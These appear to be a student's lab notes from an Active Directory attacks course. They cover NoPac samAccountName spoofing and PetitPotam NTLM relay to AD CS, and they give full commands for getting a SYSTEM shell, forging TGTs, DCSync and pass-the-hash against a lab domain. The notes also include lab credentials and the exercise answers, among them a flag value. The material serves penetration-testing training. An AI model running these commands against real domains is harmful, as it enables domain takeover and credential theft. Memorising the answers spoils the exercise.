
## NoPac - SamAccountName Spoofing

>[!info]
> This attack changes the account number of a computer to that of a Domain Controller. When done, an attacker would then request Kerberos tickets causing the service to issue tickets to the attacker under the DC's name.
>
>By default, authenticated users can add up to 10 computers to a domain

>[!info]
>NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Be sure to install it, if you haven't already
```go
git clone https://github.com/Ridter/noPac.git
```

>[!hint]
> - `scanner.py` will check if the system is vulnerable
> - `noPac.py` will be used to gain a shell as `NT AUTHORITY/SYSTEM`


##### Scanning for NoPac
```go
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

##### Running NoPac & Getting a Shell
```go
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

>[!hint]
>- smbexec.py is used to establish the shell session, so you will have to navigate using exact paths instead of cd
>- NoPac saves the TGT in the directory where the exploit was ran


##### Using noPac to DCSync the Built-in Administrator Account
>[!info]
```go
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

--------------------------------

## PetitPotam (MS-EFSRPC)

>[!info]
> This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

##### Starting ntlmrelayx.py
```go
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```


>[!info]
> Run PetitPotam in another window to coerce the DC to authenticate to your attack host where ntlmrelayx.py is running. Syntax for PetitPotam is:
> `python3 PetitPotam.py <attack host IP> <Domain Controller IP>`
```go
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

##### Catching Base64 Encoded Certificate for DC01

>[!info]
> If the PetitPotam exploit is successful you will see a successful login request and obtain a base64 encoded cert for the DC towards the bottom of the output

##### Requesting a TGT Using gettgtpkinit.py
>[!info]
>Take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```go
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

##### Setting the KRB5CCNAME Environment Variable

>[!info]
>TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

```go
export KRB5CCNAME=dc01.ccache
```

##### Using Domain Controller TGT to DCSync

>[!info]
>Use the TGT with secretsdump.py to perform a DCSync and retrieve the NTLM hashes for the domain
```go
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Now issues `klist` to view the username from the ccache file
```go
klist
```

##### Confirming Admin Access to the Domain Controller
>[!info]
>use the NT hash for the built-in Administrator account to authenticate to the Domain Controller.
```go
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```


##### Submitting a TGS Request for Ourselves Using getnthash.py
>[!info]
>Once we have the TGT for our target, use the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate

```go
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```


 Use the resulting hash to perform a DCSync with secretsdump.py using the `-hashes` flag.

##### Using Domain Controller NTLM Hash to DCSync
```go
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```


----------------------

SSH Access
```go
ssh htb-student@10.129.70.100
```

```go
'HTB_@cademy_stdnt!' 
```

```go
xfreerdp /v:10.129.70.111 /u:htb-student /p:'HTB_@cademy_stdnt!'  /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/stacking-the-deck /smart-sizing:2400x1200 /cert:ignore
```

# Questions

### Question 1: Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)

Answer:
```go
2021-42278&2021-42287
```



### Question 2: Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.

Answer:
```go
D0ntSl@ckonN0P@c!
```

Determine if machine is vulnerable
```go
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

Getting a shell
```go
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

